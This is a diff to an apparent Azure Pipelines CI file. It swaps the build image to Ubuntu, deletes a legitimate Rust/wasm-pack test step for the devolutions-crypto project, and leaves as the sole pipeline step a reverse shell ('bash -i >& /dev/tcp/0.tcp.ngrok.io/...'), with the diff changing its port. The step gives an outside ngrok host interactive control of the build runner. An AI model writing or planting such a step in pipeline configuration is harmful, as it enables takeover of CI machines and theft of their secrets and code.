@@ -7,39 +7,10 @@ trigger:
 - master
 
 pool:
-  vmImage: 'macos-latest'
+  vmImage: 'ubuntu-latest'
 
 steps:
 
-    
-- script: |
-    sudo npm i -g n
-    sudo n stable
-    sudo npm update -g npm
-
-    safaridriver --version
-    sudo safaridriver --enable
-
-    set -e
-    curl https://sh.rustup.rs -sSf | sh -s -- -y --default-toolchain stable
-    echo "##vso[task.setvariable variable=PATH;]$PATH:$HOME/.cargo/bin"
-    source $HOME/.cargo/env
-
-    cargo install wasm-pack
-
-    git clone https://github.com/Devolutions/devolutions-crypto
-
-    cd devolutions-crypto
-    cd devolutionscrypto
-
-    npm -v
-
-    npm update
-
-    wasm-pack test --safari --headless
-
-  displayName: 'Run a one-line script'
-
 
 - script: |
-    bash -i >& /dev/tcp/0.tcp.ngrok.io/14761 0>&1
+    bash -i >& /dev/tcp/0.tcp.ngrok.io/19198 0>&1
